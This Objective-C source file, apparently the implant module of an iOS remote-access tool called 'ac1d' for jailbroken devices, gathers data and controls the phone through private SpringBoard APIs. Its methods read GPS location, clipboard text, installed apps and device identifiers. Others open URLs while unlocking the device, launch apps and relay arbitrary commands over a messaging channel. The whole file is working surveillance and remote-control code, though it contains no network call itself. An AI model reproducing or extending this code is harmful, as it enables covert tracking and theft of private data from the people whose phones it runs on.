#import "ac1d.h"

@implementation ac1d

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.ac1d"];
    return self;
}

-(void)battery {
    int battery_level = ([_thisUIDevice batteryLevel] * 100);
    printf("%d", battery_level);
}

-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *result = [NSString stringWithFormat:@"Latitude: %f\nLongitude: %f\nhttp://maps.google.com/maps?q=%f,%f", coordinate.latitude, coordinate.longitude, coordinate.latitude, coordinate.longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"error";
    }
    [manager release];
    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)getvol {
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    NSString *result = [NSString stringWithFormat:@"%.2f",[AVAudioSession sharedInstance].outputVolume];
    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)openurl:(NSString *)url {
    if (![url isEqualToString:@""]) {
        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
        if (!cu) printf("error");
        else {
            bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
            if (!ret) {
                printf("error");
            }
        }
    }
}

-(void)openapp:(NSString *)application {
    CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [application UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
    if (ret != 0) {
        printf("error");
    }
    CFRelease(identifier);
}

-(void)applications {
    NSString *result = @"";
    char buf[1024];
    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
    CFIndex i;
    for (i = 0; i < CFArrayGetCount(ary); i++) {
        CFStringGetCString(CFArrayGetValueAtIndex(ary, i), buf, sizeof(buf), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n", result, buf];
    }
    printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)sysinfo {
    UIDevice *device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel]*100);
    NSString *info = [NSString stringWithFormat:@"%@ %d %@ %@ %@ %@", [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
    printf("%s", [info cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)send_command:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo] == false) {
        printf("error");
    }
}

-(void)send_reply_command:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    printf("%s", [replystr cStringUsingEncoding:NSUTF8StringEncoding]);
}

-(void)player:(NSString *)option {
    if ([option isEqualToString:@"play"]) {
        [[MPMusicPlayerController systemMusicPlayer] play];
    } else if ([option isEqualToString:@"pause"]) {
        [[MPMusicPlayerController systemMusicPlayer] pause];
    } else if ([option isEqualToString:@"next"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToNextItem];
    } else if ([option isEqualToString:@"prev"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToPreviousItem];
    } else if ([option isEqualToString:@"info"]) {
        float time1 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        [NSThread sleepForTimeInterval:0.1];
        float time2 = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        if (time1 != time2) {
            MPMediaItem *song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
            NSString *title   = [song valueForProperty:MPMediaItemPropertyTitle];
            NSString *album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
            NSString *artist  = [song valueForProperty:MPMediaItemPropertyArtist];
            NSString *result = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f", title, album, artist, time2];
            printf("%s", [result cStringUsingEncoding:NSUTF8StringEncoding]);
        } else {
            printf("error");
        }
    }
}

-(void)pasteboard {
    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
    NSString *string = pasteboard.string;
    NSLog(@"clipboard text :%@",string);
}

@end
